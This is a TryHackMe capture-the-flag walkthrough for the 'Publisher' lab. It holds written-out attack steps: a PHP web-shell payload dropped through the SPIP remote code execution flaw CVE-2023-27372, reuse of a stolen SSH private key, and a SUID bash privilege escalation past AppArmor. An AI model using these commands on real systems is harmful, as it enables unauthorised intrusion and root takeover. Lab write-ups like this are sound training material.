
# 📰 TryHackMe: Publisher

> A vulnerable blog site using SPIP CMS, exploitable via unauthenticated RCE (CVE-2023-27372), followed by SSH access and privilege escalation bypassing AppArmor.

---

## 🎯 Objectives

- Identify open services and discover SPIP CMS
- Exploit unauthenticated RCE vulnerability in SPIP v4.2.0
- Retrieve private key and gain shell access via SSH
- Escalate privileges using SUID binary and AppArmor bypass
- Capture root flag

---

## 🔧 Tools Used

- `nmap` – Service & OS detection
- `gobuster` – Directory enumeration
- `exploit.py` – Exploit script for SPIP RCE
- `ssh` – Remote shell access
- `chmod`, `find`, `ps`, `cp`, `echo`, `bash` – Local privilege escalation
- Firefox + Wappalyzer – Version detection

---

## 🔍 Enumeration

Nmap Scan:
```bash
nmap 10.10.177.2 -A
```

Results:
- 22/tcp – OpenSSH 8.2p1 (Ubuntu)
- 80/tcp – Apache 2.4.41 (Ubuntu) hosting a SPIP-based blog

SPIP Version: Detected using Wappalyzer (v4.2.0)

---

## 🔎 Directory Discovery

```bash
gobuster dir -u http://10.10.177.2/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

Found: `/spip`

---

## 💥 Exploitation (RCE via CVE-2023-27372)

Payload:
```php
<?=`$_GET[0]`?>
```

Base64 Encoded: `PD89YCRfR0VUWzBdYD8+`

Exploit script:
```bash
python2 exploit.py -u http://10.10.177.2/spip/ -c 'echo PD89YCRfR0VUWzBdYD8+|base64 -d>shell.php'
```

---

## 🔑 Gaining Shell Access

Retrieved `id_rsa` private key from shell.

Set permissions:
```bash
chmod 600 id_rsa
```

SSH into machine:
```bash
ssh think@10.10.177.2 -i id_rsa
```

---

## 🔓 Privilege Escalation

Check for SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Found a binary executing `/opt/run_container.sh`. We have write access to this script.

---

## 🧱 AppArmor Bypass

Checked running services:
```bash
service --status-all | grep '+'
```

Found AppArmor enabled.

Verified ash shell with:
```bash
ps -p $$ -o args=
getent passwd think
```

Bypassed AppArmor:
```bash
cp /bin/bash /dev/shm
ls -la /dev/shm
```

Confirmed `/dev/shm/bash` exists.

Modified `run_container.sh`:
```bash
echo 'chmod u+s /bin/bash' > /opt/run_container.sh
```

Executed:
```bash
/usr/sbin/run_container
bash -p
```

---

## 🏁 Root Access Achieved

You now have a root shell via SUID’d bash.

---

## 📚 What I Learned

- Identifying vulnerable CMS via enumeration
- Exploiting public CVEs (CVE-2023-27372) for RCE
- Using base64 + shell payloads for web exploitation
- SSH access using extracted private key
- AppArmor basics and privilege escalation bypass

---

✅ End of walkthrough.
